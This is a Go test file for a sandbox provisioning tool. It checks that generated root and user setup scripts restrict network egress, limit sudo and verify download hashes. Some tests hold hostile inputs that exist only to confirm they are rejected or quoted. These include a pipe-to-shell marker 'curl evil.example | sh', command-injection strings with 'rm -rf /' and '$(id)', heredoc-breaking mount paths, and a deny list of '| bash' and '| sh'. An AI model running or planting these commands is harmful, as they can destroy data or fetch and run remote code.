package provision

import (
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/jurajpiar/devkit/internal/project"
)

func params(mod func(*project.Config)) Params {
	c := project.Default()
	c.Name = "test"
	c.Tools.Manager = project.ManagerMise
	c.Tools.Versions = map[string]string{"node": "22", "go": "1.27"}
	if mod != nil {
		mod(c)
	}
	return Params{Config: c, User: "alice", EgressSHA256: "abc123", MountPath: "/Users/alice/proj"}
}

func TestSystemScriptAllowlist(t *testing.T) {
	s, err := System(params(nil))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"MODE=\"allowlist\"",
		"ALLOW_HOST=0",
		"EXTRA_ARGS=-allowed=github.com,",
		`echo "abc123" > /etc/devkit/egress.sha256`,
		`MISE_VERSION="` + MiseVersion + `"`,
		`want="` + MiseArm64SHA + `"`,
		`want="` + MiseAmd64SHA + `"`,
		"https://github.com/jdx/mise/releases/download/${MISE_VERSION}/mise-${MISE_VERSION}-linux-${arch}.tar.xz",
		`if [ "$got" != "$want" ]; then`,
		`install -m 755 -o root -g root "$tmp/mise/bin/mise" /usr/local/bin/mise`,
		`disable_backends = ["asdf", "vfox"]`,
		"paranoid = true",
		`lockfile_platforms = ["linux-arm64", "linux-x64"]`,
		`trusted_config_paths = ["$DEVKIT_HOME/workspace"]`,
		`export PATH="$HOME/.local/share/mise/shims:$PATH"`,
		"--uid-owner devkit-proxy -j ACCEPT",
		"rm -f /etc/sudoers.d/90-cloud-init-users",
		"if ! timeout 5 loginctl list-sessions >/dev/null 2>&1; then",
		"systemctl kill --signal=SIGKILL systemd-logind.service || true",
		`loginctl enable-linger "$DEVKIT_USER" || true`,
		`limablock="$(sed -n '/^#LIMA-START/,/^#LIMA-END/p' /etc/environment)"`,
		`printf '%s\n' "$limablock" >> /etc/environment`,
		"NOPASSWD: DEVKIT_LIMA",
		"/usr/bin/diff -q /run/lima-boot-done /mnt/lima-cidata/meta-data",
		"/usr/bin/diff -q /run/lima-ssh-ready /mnt/lima-cidata/meta-data",
		"/usr/bin/cat /mnt/lima-cidata/param.env",
		`gpasswd -d "$DEVKIT_USER" sudo`,
		`-d "$ip" -p udp --dport 53 -j ACCEPT`,
		`iptables -A OUTPUT -d "$HOST_IP" -j ACCEPT`,
		`NO_PROXY_HOSTS="localhost,127.0.0.1"`,
		`tmp="$(mktemp /var/lib/devkit/egressproxy.XXXXXX)"`,
		`sha256sum "$tmp"`,
		`-d "$HOST_IP" -j REJECT`,
		"PathExists=/var/lib/devkit/drop/egressproxy",
		"User=devkit-proxy",
		"/usr/local/sbin/devkit-firewall\n",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("system script missing %q", want)
		}
	}
	if strings.Contains(s, "NOPASSWD:ALL") {
		t.Error("full sudo must not be granted by default")
	}
	for _, bad := range []string{"nodesource", "| bash", "| sh", "sha256sum \"$f\"", "releases.nixos.org"} {
		if strings.Contains(s, bad) {
			t.Errorf("system script must not contain %q", bad)
		}
	}
	// Port 53 is only ever opened towards a specific resolver address.
	if strings.Contains(s, "-p udp --dport 53 -j ACCEPT\n") && !strings.Contains(s, `-d "$ip" -p udp --dport 53`) {
		t.Error("DNS rule must be scoped to resolver addresses")
	}
	if strings.Count(s, "--dport 53 -j ACCEPT") != 2 {
		t.Errorf("expected exactly two scoped DNS rules, got %d", strings.Count(s, "--dport 53 -j ACCEPT"))
	}
}

func TestSystemScriptOpenAndSudo(t *testing.T) {
	s, err := System(params(func(c *project.Config) {
		c.Network.Mode = project.NetworkOpen
		c.Network.AllowHost = true
		c.Sudo = true
		c.Tools.Manager = project.ManagerNone
		c.Tools.Versions = nil
		c.Tools.Packages = []string{"postgresql-client", "jq"}
	}))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"MODE=\"open\"",
		"ALLOW_HOST=1",
		"EXTRA_ARGS=-allowed=*",
		"NOPASSWD:ALL",
		`WANT_PKGS="postgresql-client jq"`,
		`NO_PROXY_HOSTS="localhost,127.0.0.1,host.lima.internal"`,
		// open mode still forces everything through the audited proxy
		"allowlist|open)",
		"--uid-owner devkit-proxy -j ACCEPT",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("system script missing %q", want)
		}
	}
	for _, bad := range []string{"MISE_VERSION=", "NIX_VERSION=", "github.com/jdx/mise"} {
		if strings.Contains(s, bad) {
			t.Errorf("manager: none must not install a toolchain manager; found %q", bad)
		}
	}
	if !strings.Contains(s, "rm -f /etc/profile.d/devkit-mise.sh") {
		t.Error("switching away from mise must drop its profile hook")
	}
	if strings.Contains(s, "open) ;;") {
		t.Error("open mode must not leave the OUTPUT chain unrestricted")
	}
}

func TestPolicyFilesAreNotShellExpanded(t *testing.T) {
	s, err := System(params(func(c *project.Config) {
		c.Network.Allow = []string{"registry.npmjs.org"}
	}))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"cat > /etc/devkit/network.conf <<'EOF'\nMODE=allowlist\n",
		"cat > /etc/devkit/egress.conf <<'EOF'\nEXTRA_ARGS=-allowed=registry.npmjs.org\n",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("policy files must be written through quoted heredocs; missing %q", want)
		}
	}
}

func TestSystemScriptTrustStore(t *testing.T) {
	s, err := System(params(func(c *project.Config) {
		c.Network.Distrust = []string{"AAA Certificate Services", "emSign ECC Root CA - G3"}
	}))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		// Distrust is recorded only when this boot flips a root from enabled
		// to disabled, so a distro-disabled root is left to the distro.
		`if grep -q "^mozilla/$f\.crt\$" "$CACONF"; then`,
		`elif grep -q "^!mozilla/$f\.crt\$" "$CACONF"; then`,
		"is already disabled by the distro",
		// The audit skips non-regular files, reads DER, bounds the cache age
		// and exits 2 on a crash rather than 1.
		"if os.path.isfile(path):",
		`["openssl", "x509", "-inform", "DER", "-outform", "PEM"]`,
		"CACHE_FRESH, CACHE_MAX = 86400, 7 * 86400",
		"os._exit(2)",
		// What the sandbox may see of the host, for the probe to judge mounts.
		"cat > /etc/devkit/source.conf <<'EOF'",
		"SOURCE=copy",
		"MOUNT_POINT=\n",

		"$APT install -y -q --only-upgrade ca-certificates",
		"systemctl disable --now apt-daily.timer apt-daily-upgrade.timer unattended-upgrades.service",
		"systemctl mask apt-daily.service apt-daily-upgrade.service",
		"-o DPkg::Lock::Timeout=300",
		"/var/lib/devkit/.distrust",
		`n="AAA Certificate Services"; f="${n// /_}"`,
		`n="emSign ECC Root CA - G3"`,
		"update-ca-certificates --fresh",
		`export NODE_OPTIONS="--use-openssl-ca${NODE_OPTIONS:+ $NODE_OPTIONS}"`,
		"export SSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crt",
		"cat > /usr/local/bin/devkit-audit <<'PYEOF'\n#!/usr/bin/env python3",
		"\nPYEOF\nchmod 755 /usr/local/bin/devkit-audit",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("system script missing %q", want)
		}
	}
	// The audit script must not terminate its own heredoc early.
	body := s[strings.Index(s, "<<'PYEOF'")+9 : strings.Index(s, "\nPYEOF\n")]
	if strings.Count(s, "\nPYEOF\n") != 1 || strings.Contains(body, "PYEOF") {
		t.Error("audit script heredoc is not intact")
	}
	none, _ := System(params(func(c *project.Config) { c.Network.Mode = project.NetworkNone }))
	if !strings.Contains(none, "if [ \"$MODE\" != \"none\" ]; then\n  ($APT update -q") {
		t.Error("the bundle refresh must be skipped when air-gapped")
	}
}

func TestSystemScriptNone(t *testing.T) {
	s, err := System(params(func(c *project.Config) { c.Network.Mode = project.NetworkNone }))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(s, "MODE=\"none\"") {
		t.Error("missing MODE=none")
	}
}

func TestSystemScriptNix(t *testing.T) {
	s, err := System(params(func(c *project.Config) {
		c.Tools.Manager = project.ManagerNix
		c.Tools.Versions = nil
	}))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		`NIX_VERSION="` + NixVersion + `"`,
		`want="` + NixArm64SHA + `"`,
		`want="` + NixAmd64SHA + `"`,
		"https://releases.nixos.org/nix/nix-${NIX_VERSION}/nix-${NIX_VERSION}-${sys}.tar.xz",
		`echo "devkit: refused Nix ${NIX_VERSION} with hash $got (expected $want)"`,
		`HOME=/root USER=root "$tmp/nix-${NIX_VERSION}-${sys}/install" --daemon --yes --no-channel-add --no-modify-profile`,
		"experimental-features = nix-command flakes",
		"/etc/systemd/system/nix-daemon.service.d/devkit-proxy.conf",
		"Environment=HTTP_PROXY=$PROXY_URL HTTPS_PROXY=$PROXY_URL",
		". /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("nix system script missing %q", want)
		}
	}
	if strings.Contains(s, "MISE_VERSION=") {
		t.Error("nix mode must not install mise")
	}
	// The download must run before the proxy is up and never through it.
	// An array, not a string: a bare * in a string variable would glob.
	if !strings.Contains(s, `"${CURL[@]}" -o "$tmp/nix.tar.xz"`) || !strings.Contains(s, `CURL=(curl -fsSL --noproxy '*' --retry 3 --retry-all-errors --connect-timeout 30 --max-time 900)`) {
		t.Error("nix archive must be fetched directly, like apt during provisioning")
	}
	u, _ := User(params(func(c *project.Config) { c.Tools.Manager = project.ManagerNix; c.Tools.Versions = nil }))
	if strings.Contains(u, "mise") {
		t.Error("nix mode must not write a mise config")
	}
}

func TestUserScript(t *testing.T) {
	s, err := User(params(nil))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(s, `mkdir -p "$HOME/workspace"`) {
		t.Errorf("copy mode should create the workspace: %s", s)
	}
	// Versions are written through a quoted heredoc, sorted, one per line.
	for _, want := range []string{
		`cat > "$HOME/.config/mise/config.toml" <<'EOF'`,
		"lockfile = true",
		"[tools]\ngo = \"1.27\"\nnode = \"22\"\nEOF",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("user script missing %q:\n%s", want, s)
		}
	}
	s, _ = User(params(func(c *project.Config) { c.Source = project.SourceMount }))
	if !strings.Contains(s, `ln -s '/Users/alice/proj' "$HOME/workspace"`) {
		t.Errorf("mount mode should symlink the mount: %s", s)
	}
	sys, _ := System(params(func(c *project.Config) { c.Source = project.SourceMount }))
	if !strings.Contains(sys, "SOURCE=mount\nMOUNT_POINT=/Users/alice/proj\n") {
		t.Errorf("mount mode should record the mount point for the probe: %s", sys)
	}
	// The path is the host's choice: it is one shell word in the user
	// script, and a line break, the only thing that could end the root
	// heredoc early, is refused outright.
	p := params(func(c *project.Config) { c.Source = project.SourceMount })
	p.MountPath = "/Users/alice/it's $(evil) `here`"
	if s, err := User(p); err != nil || !strings.Contains(s, `ln -s '/Users/alice/it'\''s $(evil) `+"`here`'") {
		t.Errorf("mount path should be single-quoted as one word: %v\n%s", err, s)
	}
	for _, brk := range []string{"\n", "\r", "\u0085", "\u2028", "\u2029"} {
		p.MountPath = "/Users/alice/proj" + brk + "EOF" + brk + "rm -rf /"
		if _, err := System(p); err == nil || !strings.Contains(err.Error(), "line break") {
			t.Errorf("a mount path with %q must be refused, got %v", brk, err)
		}
	}
	if _, err := User(p); err == nil {
		t.Error("the user script must refuse it too")
	}
}

// Adversarial: a hostile devkit.yaml tries to reach root through the
// provisioning scripts. Validation is the gate; this checks both that the
// gate holds and that nothing user-controlled is rendered unquoted.
func TestHostileConfigCannotReachRoot(t *testing.T) {
	attacks := []string{
		`22"; rm -rf /; echo "`,
		"22\nEOF\nrm -rf /\ncat <<'EOF'",
		"$(id)", "`id`", "${HOME}", "22 && id", "22;id", "22|id", "22 ", " 22",
	}
	for _, a := range attacks {
		c := project.Default()
		c.Name = "x"
		c.Tools.Manager = project.ManagerMise
		c.Tools.Versions = map[string]string{"node": a}
		if err := c.Validate(); err == nil {
			t.Errorf("version %q should be rejected", a)
		}
		c.Tools.Versions = map[string]string{a: "22"}
		if err := c.Validate(); err == nil {
			t.Errorf("tool name %q should be rejected", a)
		}
		c.Tools.Versions = nil
		c.Tools.Packages = []string{a}
		if err := c.Validate(); err == nil {
			t.Errorf("package %q should be rejected", a)
		}
	}

	// install: is free-form on purpose. It must run as the sandbox user and
	// never appear in either provisioning script, which run as root or at
	// boot before the firewall.
	marker := "curl evil.example | sh"
	sys, _ := System(params(func(c *project.Config) { c.Install = marker }))
	usr, _ := User(params(func(c *project.Config) { c.Install = marker }))
	if strings.Contains(sys, marker) || strings.Contains(usr, marker) {
		t.Error("install: must not be rendered into provisioning scripts")
	}

	// Values that pass validation land in the user config as exactly one
	// TOML line each, inside a quoted heredoc.
	usr, _ = User(params(func(c *project.Config) {
		c.Tools.Versions = map[string]string{"node": "22", "ruby": "3.3.6", "rust": "nightly-2026-01-01"}
	}))
	body := usr[strings.Index(usr, "[tools]"):]
	body = body[:strings.Index(body, "\nEOF")]
	want := "[tools]\nnode = \"22\"\nruby = \"3.3.6\"\nrust = \"nightly-2026-01-01\""
	if body != want {
		t.Errorf("tools block = %q, want %q", body, want)
	}
	if strings.Count(usr, "\nEOF\n") != 1 {
		t.Errorf("exactly one heredoc terminator expected in the user script:\n%s", usr)
	}
}

// TestEnvironmentEditsAreIdempotent runs the /etc/environment fragment of the
// system script twice, with proxy entries inside Lima's block, and checks that
// the second run changes nothing and the block comes through untouched and
// last. Lima terminates the user's sessions whenever the file differs after its
// own rewrite, so any drift here re-arms the logind stall on every boot.
func TestEnvironmentEditsAreIdempotent(t *testing.T) {
	sed := "sed"
	if runtime.GOOS == "darwin" {
		sed = "gsed"
	}
	if _, err := exec.LookPath(sed); err != nil {
		t.Skipf("needs GNU sed (%s)", sed)
	}
	limaBlock := "#LIMA-START\nHTTP_PROXY=http://host.proxy:3128\nhttp_proxy=http://host.proxy:3128\nPATH=/usr/bin\n#LIMA-END\n"
	for _, mode := range []string{project.NetworkAllowlist, project.NetworkNone} {
		t.Run(mode, func(t *testing.T) {
			s, err := System(params(func(c *project.Config) { c.Network.Mode = mode }))
			if err != nil {
				t.Fatal(err)
			}
			start := strings.Index(s, "# Runtimes that carry their own root list")
			end := strings.Index(s[start:], "printf '%s\\n' \"$limablock\" >> /etc/environment\nfi\n")
			if start < 0 || end < 0 {
				t.Fatal("environment fragment not found")
			}
			frag := s[start : start+end+len("printf '%s\\n' \"$limablock\" >> /etc/environment\nfi\n")]
			dir := t.TempDir()
			env := filepath.Join(dir, "environment")
			// Quoted: TMPDIR may hold spaces or shell metacharacters.
			q := func(p string) string { return "'" + strings.ReplaceAll(p, "'", `'\''`) + "'" }
			frag = strings.ReplaceAll(frag, "/etc/environment", q(env))
			frag = strings.ReplaceAll(frag, "/etc/profile.d", q(dir))
			frag = strings.ReplaceAll(frag, "/etc/apt/apt.conf.d", q(dir))
			frag = strings.ReplaceAll(frag, "/usr/local/bin", q(dir))
			frag = strings.ReplaceAll(frag, "sed -i", sed+" -i")
			frag = strings.ReplaceAll(frag, "id devkit-proxy >/dev/null 2>&1 || useradd", "true || useradd")
			script := "set -eu\nMODE=" + mode + "\n" + frag
			if err := os.WriteFile(env, []byte("LANG=C\n"+limaBlock+"STALE=1\nHTTP_PROXY=http://old:1\n"), 0o644); err != nil {
				t.Fatal(err)
			}
			run := func() string {
				out, err := exec.Command("bash", "-c", script).CombinedOutput()
				if err != nil {
					t.Fatalf("fragment failed: %v\n%s", err, out)
				}
				b, err := os.ReadFile(env)
				if err != nil {
					t.Fatal(err)
				}
				return string(b)
			}
			first := run()
			second := run()
			if first != second {
				t.Errorf("second run changed the file:\n--- first\n%s--- second\n%s", first, second)
			}
			if !strings.HasSuffix(first, limaBlock) {
				t.Errorf("Lima block not last or altered:\n%s", first)
			}
			if strings.Contains(strings.TrimSuffix(first, limaBlock), "http://old:1") {
				t.Errorf("stale proxy line outside the block survived:\n%s", first)
			}
			if mode == project.NetworkAllowlist && !strings.Contains(first, "HTTPS_PROXY=http://127.0.0.1:3128\n") {
				t.Errorf("devkit proxy line missing:\n%s", first)
			}
		})
	}
}
